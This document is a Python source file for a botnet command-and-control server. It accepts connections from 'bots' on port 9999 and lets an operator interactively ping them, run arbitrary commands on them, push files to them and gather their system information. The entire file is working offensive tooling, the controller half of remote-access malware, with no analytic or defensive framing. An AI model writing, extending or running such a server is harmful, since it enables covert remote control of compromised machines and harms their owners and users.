import socket
import threading
import os

class C2Server:
    def __init__(self, host='0.0.0.0', port=9999):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(5)
        self.bots = []

    def handle_bot(self, client_socket):
        while True:
            try:
                command = input("--> Enter a command (ping, run_command, file_transfer, system_info): ").strip()
                if command == 'exit':
                    break
                elif command == 'ping':
                    self.ping(client_socket)
                elif command == 'run_command':
                    self.run_command(client_socket)
                elif command == 'file_transfer':
                    self.file_transfer(client_socket)
                elif command == 'system_info':
                    self.system_info(client_socket)
                else:
                    print("[*] Invalid command")
            except Exception as e:
                print(f"[-] Bot disconnected: {e}")
                break
        client_socket.close()

    def ping(self, client_socket):
        client_socket.send('ping'.encode('utf-8'))
        response = client_socket.recv(4096).decode('utf-8')
        print(f"[+] Bot response: {response}")

    def run_command(self, client_socket):
        cmd = input("--> Enter the command to run on the bot: ")
        client_socket.send(f'run_command:{cmd}'.encode('utf-8'))
        response = client_socket.recv(4096).decode('utf-8')
        print(f"[+] Command output: {response}")

    def file_transfer(self, client_socket):
        file_path = input("--> Enter the full path of the file to transfer: ")
        if os.path.exists(file_path):
            client_socket.send(f'file_transfer:{os.path.basename(file_path)}'.encode('utf-8'))
            with open(file_path, 'rb') as file:
                client_socket.send(file.read())
            print(f"[+] File {file_path} sent to the bot.")
        else:
            print("[-] File does not exist.")

    def system_info(self, client_socket):
        client_socket.send('system_info'.encode('utf-8'))
        response = client_socket.recv(4096).decode('utf-8')
        print(f"[*] System info: {response}")

    def start(self):
        print("[+] C2 Server started and waiting for bots...")
        while True:
            client_socket, addr = self.server.accept()
            print(f"[+] Accepted connection from {addr}")
            self.bots.append(client_socket)
            threading.Thread(target=self.handle_bot, args=(client_socket,)).start()

if __name__ == '__main__':
    c2_server = C2Server()
    c2_server.start()
